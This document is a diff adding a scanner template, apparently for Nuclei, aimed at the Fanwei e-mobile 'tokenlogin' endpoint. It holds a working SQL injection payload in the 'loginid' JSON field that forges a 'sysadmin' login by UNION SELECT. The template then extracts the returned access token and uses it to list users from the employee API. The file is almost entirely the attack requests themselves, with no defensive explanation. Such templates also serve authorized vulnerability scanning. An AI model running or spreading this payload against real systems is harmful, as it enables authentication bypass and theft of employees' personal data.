@@ -1,0 +1,43 @@
+id: fanwei-emp-tokenlogin-sqli
+
+info:
+  name: fanwei-emp-tokenlogin-sqli
+  author: fanwei-emp-tokenlogin-sqli
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /emp/passport/tokenlogin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+        Connection: close
+        Content-Type: application/json
+
+        {
+          "loginid": "aaa'\nunion\nselect 1,'2','3','4',5,6,'7','8','9',10,11,12,'13',14,15,'sysadmin','17',18,19,20,'21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37',38,'39','40','41','42','43',44,45,'46','47','48',49,'50','51','52',53,54,55,56 from hrmresourcemanager where '1'='1",
+          "loginTokenFromThird": "23c3a444daf31721ce3d917cf41035732363b9c6",
+          "timestamp": "2654153730789"
+        }
+
+
+      - |
+        GET /emp/api/user/list?department_id=&fetch_child=1&pagenum=1&pagesize=10&keyword=&status=0&ismain= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
+        emaccesstk: {{emaccesstk}}
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1==200 && contains_all(body_1,"birthday","sys_inner_url")
+
+    extractors:
+      - type: json
+        name: emaccesstk
+        part: body
+        internal: true
+        json:
+          - .access_token
